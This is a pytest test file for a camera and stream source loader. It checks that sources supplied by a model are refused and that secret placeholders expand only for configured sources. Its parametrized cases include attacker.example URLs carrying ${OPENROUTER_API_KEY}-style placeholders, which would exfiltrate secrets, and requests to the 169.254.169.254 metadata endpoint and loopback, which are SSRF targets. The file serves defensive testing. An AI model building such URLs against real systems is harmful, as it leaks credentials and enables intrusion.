"""Network sources and ``${NAME}`` secret placeholders only come from the user's own config."""

from __future__ import annotations

import pytest
from harness.plugin_loader import plugin_module

src = plugin_module("sentinel.sources")

STREAMS = {"door": "https://cam.local/snap.jpg?key=${DOOR_KEY}", "hall": "rtsp://cam.local/live"}


@pytest.mark.parametrize(
    "source",
    [
        "snapshot:https://attacker.example/x.jpg?k=${OPENROUTER_API_KEY}",
        "https://attacker.example/x.jpg?k=${ANY_KEY}",
        "http://127.0.0.1/latest",
        "http://169.254.169.254/latest/meta-data/",
        "stream:rtsp://169.254.169.254/live",
        "rtsp://[::1]/live",
    ],
)
def test_model_supplied_network_sources_are_refused(source, shim_binding):
    with pytest.raises(src.SourceSpecError, match="stream_urls"):
        src.open_source(source, named_streams=STREAMS)
    assert not shim_binding.secrets_read  # nothing was looked up, let alone sent anywhere


@pytest.mark.parametrize("source", ["door", "stream:door", "hall", "stream:hall"])
def test_configured_stream_names_open_and_may_use_placeholders(source, shim_binding):
    shim_binding.secrets["DOOR_KEY"] = "s3cret"
    opened = src.open_source(source, named_streams=STREAMS)
    assert opened.spec.configured


def test_the_configured_default_source_is_trusted():
    url = "rtsp://cam.local/live"
    assert src.open_source(url, trusted_sources=(url,)).spec.configured
    with pytest.raises(src.SourceSpecError):
        src.open_source("rtsp://other.local/live", trusted_sources=(url,))


def test_local_sources_need_no_configuration():
    for source in ("camera:0", "screen:1@0,0,640,480", "folder:/tmp", "file:/tmp/clip.mp4"):
        assert not src.open_source(source).spec.configured


def test_a_mapping_cannot_mark_itself_configured():
    with pytest.raises(src.SourceSpecError, match="unknown source fields"):
        src.SourceSpec.parse({"spec": "https://x.example/a.jpg", "configured": True})


def test_placeholders_are_never_expanded_for_an_unconfigured_spec(shim_binding):
    shim_binding.secrets["ANY_KEY"] = "s3cret"
    spec = src.SourceSpec(kind="snapshot", target="https://x.example/a.jpg?k=${ANY_KEY}")
    with pytest.raises(src.SourceSpecError, match="configured sources"):
        src.SnapshotUrlSource(spec).open()
    assert not shim_binding.secrets_read
